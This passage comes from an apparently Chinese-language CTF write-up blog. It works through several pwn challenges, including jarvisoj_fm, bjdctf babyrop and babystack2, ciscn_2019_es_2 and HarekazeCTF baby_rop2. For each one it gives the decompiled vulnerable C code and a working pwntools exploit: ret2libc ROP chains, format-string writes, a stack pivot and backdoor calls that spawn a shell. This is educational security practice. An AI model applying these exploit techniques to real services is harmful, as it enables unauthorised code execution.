LFS.&quot;</span>);<br>  printf(<span class="hljs-string">&quot;Please input admin password:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%100s&quot;</span>, s1);<br>  <span class="hljs-keyword">if</span> ( strcmp(s1, <span class="hljs-string">&quot;administrator&quot;</span>) )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Password Error!&quot;</span>);<br>    exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;Welcome!&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Input your operation:&quot;</span>);<br>    puts(<span class="hljs-string">&quot;1.Add a log.&quot;</span>);<br>    puts(<span class="hljs-string">&quot;2.Display all logs.&quot;</span>);<br>    puts(<span class="hljs-string">&quot;3.Print all logs.&quot;</span>);<br>    printf(<span class="hljs-string">&quot;0.Exit\n:&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;s1_);<br>    switch ( s1_ )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>        exit(<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> result;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        AddLog(src);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        Display(src);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        Print();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        GetFlag(src);<br>        <span class="hljs-keyword">break</span>;<br>      default:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 这道题也有毛病，我打libc打不了原因是我在写got的地址时候，它会重置到该字符串的头地址上，写其他地址则不会，脑子有坑吧</span><br><span class="hljs-comment">## junk是生成垃圾数据的一个函数</span><br>sh = <span class="hljs-number">0x080482ea</span><br><span class="hljs-comment"># ROPgadget --binary pwn --string sh</span><br><span class="hljs-comment">## 其实这个看到有sh就可以，原字符串是fflush，从则截取的sh</span><br>sl(<span class="hljs-string">&#x27;administrator&#x27;</span>)<br><br>sla(<span class="hljs-string">&#x27;Exit\n:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>payload = junk(<span class="hljs-number">0x48</span>+<span class="hljs-number">4</span>) + p(elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]) + junk(<span class="hljs-number">4</span>) + p(sh)<br><br>sla(<span class="hljs-string">&#x27;info:&#x27;</span>,payload)<br><br>sla(<span class="hljs-string">&#x27;Exit\n:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br></code></pre></td></tr></table></figure><h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a><font style="color:rgb(33, 37, 41);">铁人三项(第五赛区)_2018_rop</font></h1><blockquote><p>考点</p><ul><li>32位栈溢出</li><li>Ret2libc</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t vulnerable_function()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">136</span>]; // [esp+10h] [ebp-88h] BYREF<br><br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x100u);<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  be_nice_to_people();<br>  vulnerable_function();<br>  <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Hello, World\n&quot;</span>, 0xDu);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>func_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;vulnerable_function&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x88</span>+<span class="hljs-number">4</span><br><br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(func_plt) + p(again) +p(<span class="hljs-number">1</span>)+p(func_got)+p(<span class="hljs-number">4</span>)<br><br>sl(payload)<br><br>func_addr = u(r(<span class="hljs-number">4</span>))<br>lgs(<span class="hljs-built_in">hex</span>(func_addr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,func_addr)<br>libcBase = func_addr - libc.dump(<span class="hljs-string">&#x27;write&#x27;</span>)<br>sysAddr = libcBase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>shellStr = libcBase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = overoff*<span class="hljs-string">b&#x27;a&#x27;</span> + p(sysAddr)+ p(again) + p(shellStr)<br>sl(payload)<br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a><font style="color:rgb(33, 37, 41);">bjdctf_2020_babystack2</font></h1><blockquote><p>考点</p><ul><li>64位栈溢出</li><li>栈平衡</li><li>整数溢出</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  _BYTE buf[<span class="hljs-number">12</span>]; // [rsp+0h] [rbp-10h] BYREF<br>  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF<br><br>  setvbuf(_bss_start, 0LL, <span class="hljs-number">2</span>, 0LL);<br>  setvbuf(stdin, 0LL, <span class="hljs-number">1</span>, 0LL);<br>  LODWORD(nbytes) = <span class="hljs-number">0</span>;<br>  puts(<span class="hljs-string">&quot;**********************************&quot;</span>);<br>  puts(<span class="hljs-string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;* And Welcome to the bin world!  *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);<br>  puts(<span class="hljs-string">&quot;* Please told me u answer loudly!*&quot;</span>);<br>  puts(<span class="hljs-string">&quot;[+]Are u ready?&quot;</span>);<br>  puts(<span class="hljs-string">&quot;[+]Please input the length of your name:&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nbytes);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-built_in">int</span>)nbytes &gt; <span class="hljs-number">10</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;Oops,u name is too long!&quot;</span>);<br>    exit(-<span class="hljs-number">1</span>);<br>  &#125;<br>  puts(<span class="hljs-string">&quot;[+]What&#x27;s u name?&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, (unsigned <span class="hljs-built_in">int</span>)nbytes);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## int类型的负数强转为unsigned int会变得很大：-1 ----&gt; 0xffffffff</span><br>sl(<span class="hljs-built_in">str</span>(-<span class="hljs-number">1</span>))<br>payload = junk(<span class="hljs-number">0x18</span>) + p(elf.sym[<span class="hljs-string">&#x27;backdoor&#x27;</span>]+<span class="hljs-number">1</span>)<br>sl(payload)<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a><font style="color:rgb(33, 37, 41);">jarvisoj_fm</font></h1><blockquote><p>考点</p><ul><li>fmt<ul><li>修改任意地址数据</li></ul></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char buf[<span class="hljs-number">80</span>]; // [esp+2Ch] [ebp-5Ch] BYREF<br>  unsigned <span class="hljs-built_in">int</span> v5; // [esp+7Ch] [ebp-Ch]<br><br>  v5 = __readgsdword(0x14u);<br>  be_nice_to_people();<br>  memset(buf, <span class="hljs-number">0</span>, sizeof(buf));<br>  read(<span class="hljs-number">0</span>, buf, 0x50u);<br>  printf(buf);<br>  printf(<span class="hljs-string">&quot;%d!\n&quot;</span>, x);<br>  <span class="hljs-keyword">if</span> ( x == <span class="hljs-number">4</span> )<br>  &#123;<br>    puts(<span class="hljs-string">&quot;running sh...&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>x = <span class="hljs-number">0x0804A02C</span><br>payload = fmtstr_payload(<span class="hljs-number">11</span>,&#123;x:<span class="hljs-number">4</span>&#125;)<br><span class="hljs-comment">## 等价于payload = b&#x27;%4c%13$n&#x27; + p(x)</span><br>sl(payload)<br></code></pre></td></tr></table></figure><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a><font style="color:rgb(33, 37, 41);">bjdctf_2020_babyrop</font></h1><blockquote><p>考点</p><ul><li>64位栈溢出</li><li>Ret2libc</li><li>ROPgadget</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">ssize_t vuln()<br>&#123;<br>  _BYTE buf[<span class="hljs-number">32</span>]; // [rsp+0h] [rbp-20h] BYREF<br><br>  puts(<span class="hljs-string">&quot;Pull up your sword and tell me u story!&quot;</span>);<br>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, buf, 0x64uLL);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>func_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;vuln&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x20</span>+<span class="hljs-number">8</span><br><br>rdiRet = <span class="hljs-number">0x0000000000400733</span><br>Ret = <span class="hljs-number">0x00000000004004c9</span><br><br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p(rdiRet) + p(func_got) + p(func_plt) <br>payload += p(again)<br><br>sla(<span class="hljs-string">&quot;story!\n&quot;</span>,payload)<br><br>funcAddr = u(rl().strip()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lgs(<span class="hljs-built_in">hex</span>(funcAddr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,funcAddr)<br>libcBase = funcAddr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sysAddr = libcBase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>shellStr = libcBase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span> + p(Ret) + p(rdiRet) + p(shellStr) + p(sysAddr)<br><br>sl(payload)<br></code></pre></td></tr></table></figure><h1 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a><font style="color:rgb(33, 37, 41);">jarvisoj_tell_me_something</font></h1><blockquote><p>考点</p><ul><li>64位栈溢出+后门</li><li>栈平衡</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  __int64 buf_; // [rsp+0h] [rbp-88h] BYREF<br><br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Input your message:\n&quot;</span>, 0x14uLL);<br>  read(<span class="hljs-number">0</span>, &amp;buf_, 0x100uLL);<br>  <span class="hljs-keyword">return</span> write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;I have received your message, Thank you!\n&quot;</span>, 0x29uLL);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>payload = junk(<span class="hljs-number">0x88</span>) + p(elf.sym[<span class="hljs-string">&#x27;good_game&#x27;</span>]+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a><font style="color:rgb(33, 37, 41);">ciscn_2019_es_2</font></h1><blockquote><p>考点</p><ul><li>栈迁移</li><li>数据收集</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> vul()<br>&#123;<br>  char s[<span class="hljs-number">40</span>]; // [esp+0h] [ebp-28h] BYREF<br><br>  memset(s, <span class="hljs-number">0</span>, 0x20u);<br>  read(<span class="hljs-number">0</span>, s, 0x30u);<br>  printf(<span class="hljs-string">&quot;Hello, %s\n&quot;</span>, s);<br>  read(<span class="hljs-number">0</span>, s, 0x30u);<br>  <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;Hello, %s\n&quot;</span>, s);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## p(0)是call system的返回地址</span><br><span class="hljs-comment">## p(buf+0xc)----&gt;/bin/sh\x00</span><br>leave_ret = <span class="hljs-number">0x080485FD</span><br><br>payload = junk(<span class="hljs-number">0x24</span>) + <span class="hljs-string">b&#x27;TTTT&#x27;</span><br>s(payload)<br>ru(<span class="hljs-string">&#x27;TTTT&#x27;</span>)<br>main_ebp = u(r(<span class="hljs-number">4</span>))<br>lgs(<span class="hljs-built_in">hex</span>(main_ebp))<br><br>buf = main_ebp - <span class="hljs-number">0x38</span><br>lgs(<span class="hljs-built_in">hex</span>(buf))<br><br>payload = p(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]) + p(<span class="hljs-number">0</span>) + p(buf+<span class="hljs-number">0xc</span>) + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) + p(buf-<span class="hljs-number">4</span>) + p(leave_ret)<br>sl(payload)<br></code></pre></td></tr></table></figure><h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a><font style="color:rgb(33, 37, 41);">[HarekazeCTF2019]baby_rop2</font></h1><blockquote><p>考点</p><ul><li>64位栈溢出</li><li>Ret2libc</li><li>ROPgadget</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __fastcall main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  char buf[<span class="hljs-number">28</span>]; // [rsp+0h] [rbp-20h] BYREF<br>  <span class="hljs-built_in">int</span> v5; // [rsp+1Ch] [rbp-4h]<br><br>  setvbuf(stdout, 0LL, <span class="hljs-number">2</span>, 0LL);<br>  setvbuf(stdin, 0LL, <span class="hljs-number">2</span>, 0LL);<br>  printf(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>);<br>  v5 = read(<span class="hljs-number">0</span>, buf, 0x100uLL);<br>  buf[v5 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  printf(<span class="hljs-string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>func_plt = elf.plt[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>func_got = elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>again = elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>overoff = <span class="hljs-number">0x20</span>+<span class="hljs-number">8</span> - <span class="hljs-number">4</span> <br><br>rdiRet = <span class="hljs-number">0x0000000000400733</span><br>rsi_r15_ret = <span class="hljs-number">0x0000000000400731</span><br>fmt = <span class="hljs-number">0x0400770</span><br>Ret = <span class="hljs-number">0x00000000004004d1</span><br><br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;TTTT&#x27;</span><br>payload += p(rdiRet) + p(fmt) + p(rsi_r15_ret) + p(func_got) + p(<span class="hljs-number">0</span>) + p(func_plt) <br>payload += p(again)<br><br>sla(<span class="hljs-string">&quot;name? &quot;</span>,payload)<br>rl()<br>ru(<span class="hljs-string">&#x27;again, &#x27;</span>)<br><br>funcAddr = u(rl().strip()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lgs(<span class="hljs-built_in">hex</span>(funcAddr))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;read&#x27;</span>,funcAddr)<br>libcBase = funcAddr - libc.dump(<span class="hljs-string">&#x27;read&#x27;</span>)<br><br>sysAddr,shellStr = SLSysBin(libc,libcBase)<br><br>payload = overoff * <span class="hljs-string">b&#x27;a&#x27;</span> + <span class="hljs-string">b&#x27;TTTT&#x27;</span> + p(Ret) + p(rdiRet) + p(shellStr) + p(sysAddr)<br><br>sl(payload)<br></code></pre></td></tr></table></figure><h1 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a><font style="color:rgb(33, 37, 41);">picoctf_2018_rop chain</font></h1><blockquote><p>考点</p><ul><li>栈溢出</li><li>函数参数调整</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python">void win_function1()<br>&#123;<br>  win1 = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl win_function2(<span class="hljs-built_in">int</span> a1)<br>&#123;<br>  <span class="hljs-built_in">int</span> win1; // eax<br><br>  win1 = (unsigned __int8)::win1;<br>  <span class="hljs-keyword">if</span> ( ::win1 &amp;&amp; a1 == <span class="hljs-number">0xBAAAAAAD</span> )<br>  &#123;<br>    win2 = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( ::win1 )<br>  &#123;<br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Wrong Argument. Try Again.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Nope. Try a little bit harder.&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> win1;<br>&#125;<br><br><span class="hljs-built_in">int</span> __cdecl flag(<span class="hljs-built_in">int</span> a1)<br>&#123;<br>  char s[<span class="hljs-number">48</span>]; // [esp+Ch] [ebp-3Ch] BYREF<br>  FILE *stream; // [esp+3Ch] [ebp-Ch]<br><br>  stream = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( !stream )<br>  &#123;<br>    puts(<br>      <span class="hljs-string">&quot;Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.&quot;</span>);<br>    exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  fgets(s, <span class="hljs-number">48</span>, stream);<br>  <span class="hljs-keyword">if</span> ( win1 &amp;&amp; win2 &amp;&amp; a1 == <span class="hljs-number">0xDEADBAAD</span> )<br>    <span class="hljs-keyword">return</span> printf(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-keyword">if</span> ( win1 &amp;&amp; win2 )<br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Incorrect Argument. Remember, you can call other functions in between each win function!&quot;</span>);<br>  <span class="hljs-keyword">if</span> ( win1 || win2 )<br>    <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;Nice Try! You&#x27;re Getting There!&quot;</span>);<br>  <span class="hljs-keyword">return</span> puts(<span class="hljs-string">&quot;You won&#x27;t get the flag that easy..&quot;</span>);<br>&#125;<br><br>char *vuln()<br>&#123;<br>  char s[<span class="hljs-number">24</span>]; // [esp+0h] [ebp-18h] BYREF<br><br>  printf(<span class="hljs-string">&quot;Enter your input&gt; &quot;</span>);<br>  <span class="hljs-keyword">return</span> gets(s);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 注意每个参数所需要的参数已经其的返回地址即可构造一个ROP链</span><br>payload = junk(<span class="hljs-number">0x1c</span>) + p(elf.sym[<span class="hljs-string">&#x27;win_function1&#x27;</span>]) + p(elf.sym[<span class="hljs-string">&#x27;win_function2&#x27;</span>]) + p(elf.sym[<span class="hljs-string">&#x27;flag&#x27;</span>]) <br>payload += p(<span class="hljs-number">0xBAAAAAAD</span>) + p(<span class="hljs-number">0xDEADBAAD</span>)<br>sl(payload)<br></code></pre></td></tr></table></figure><h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a><font style="color:rgb(33, 37, 41);">pwn2_sctf_2016</font></h1><blockquote><p>考点</p><ul><li>32位栈溢出</li><li>整数溢出</li><li>Ret2libc</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> vuln()<br>&#123;<br>  char nptr[<span class="hljs-number">32</span>]; // [esp+1Ch] [ebp-2Ch] BYREF<br>  <span class="hljs-built_in">int</span> n32; // [esp+3Ch] [ebp-Ch]<br><br>  printf(<span class="hljs-string">&quot;How many bytes do you want me to read? &quot;</span>);<br>  get_n(nptr, <span class="hljs-number">4</span>);<br>  n32 = atoi(nptr);<br>  <span 